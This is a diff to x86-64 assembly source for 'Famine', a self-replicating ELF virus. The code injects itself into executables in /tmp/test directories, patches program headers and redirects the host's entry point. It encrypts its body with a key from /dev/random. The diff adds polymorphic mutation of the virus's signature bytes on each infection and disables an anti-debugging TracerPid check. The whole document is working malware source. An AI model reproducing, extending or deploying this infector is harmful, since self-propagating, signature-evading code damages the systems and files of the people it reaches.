@@ -38,7 +38,7 @@ loop .loop_status
 .check_trcr:
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-jne _exx_pop
+;jne _exx_pop
 
 
 
@@ -188,6 +188,9 @@ DECYPHER
 	jne _exx_pop
 
 .get_rand_key:
+	lea rsi, STACK(famine.morph_sign)	; load morph iterator for signature
+	mov rsi, 0
+
 	lea rdi, [rel random]
 	mov rsi, O_RDONLY
 	mov rax, _open
@@ -412,6 +415,35 @@ inject_self:
 		cmp rdx, 0
 		jg .loading_v
 
+
+	lea r10, STACK(famine.tocypher)
+	add r10,JUMP_DECYPHER_OFFSET
+	mov byte[r10], 0
+	
+	lea r10, STACK(famine.tocypher)
+	add r10, KEY_OFFSET
+	mov r11b, STACK(famine.key)
+	mov byte[r10], r11b
+
+	lea r10, STACK(famine.tocypher)
+	add r10, FACTOR_OFFSET
+	mov r11b, STACK(famine.factor)
+	mov byte[r10], r11b
+
+	lea r10, STACK(famine.tocypher)
+	add r10, SIGNATURE_OFFSET
+	mov r11b, STACK(famine.morph_sign)
+	inc r11b
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	add byte[r10], r11b
+	add r10, 2
+	mov STACK(famine.morph_sign), r11
+
 	push r12
 	CYPHER
 	pop r12
@@ -423,35 +455,8 @@ inject_self:
 	push r10
 	mov rax, _pwrite
 	syscall
-
 	cmp rax, 0
 	jbe .return
-
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE JUMP OVER DECYPHER METHOD WITH VALUE 0
-	lea rsi, [rel signature]
-	mov rdx, 1
-	add r10, JUMP_DECYPHER_OFFSET ; JUMP OVER DECYPHER VAL OFFSET
-	syscall
-
-	pop r10
-	push r10
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE VALUE OF KEY IN DECYPHER
-	lea rsi, STACK(famine.key)
-	mov rdx, 1
-	add r10, KEY_OFFSET ;  KEY OFFSET
-	syscall
-
-	pop r10
-	push r10
-	mov rdi, STACK(famine.file_fd) ; fd to rdi
-	mov rax, _pwrite			;OVERWRITE THE FACTOR VALUE
-	lea rsi, STACK(famine.factor)
-	mov rdx, 1
-	add r10, FACTOR_OFFSET ; KEY FACTOR OFFSET
-	syscall
-
 
 	.edit_phdr:
 	pop rax				;RDI = the offset of patched PHEADER
@@ -504,7 +509,7 @@ inject_self:
 ;	compute jump value
 	pop rdi ;   restore patched pheader 
 	mov rdx, [rdi + elf64_phdr.p_vaddr]
-	sub rdx, 9
+	sub rdx, RETURN_JUMP_VALUE_OFFSET
 	sub r14, rdx
 	sub r14, _end - _start
 	mov byte STACK(famine.jmp), JMP; jmp opcode
@@ -531,7 +536,7 @@ infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 random			db			"/dev/random"
 enc_end:
 	db 0
-signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>', 0xa, 0x00
+signature		db			0x00, 'Famine version 99.0 (c)oded by <araout>42424242', 0xa, 0x00
 pfile			db			"/proc/self/status",0
 pdir			db			"/proc/", 0, 0, 0, 0
 pname			db			"/comm"
@@ -542,6 +547,7 @@ _exx_pop:
 POP
 _exx:
 jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
+		db 00, 00, 00, 00, 00
 	.exit:
 		mov rax, _exit
 		mov rdi, 0
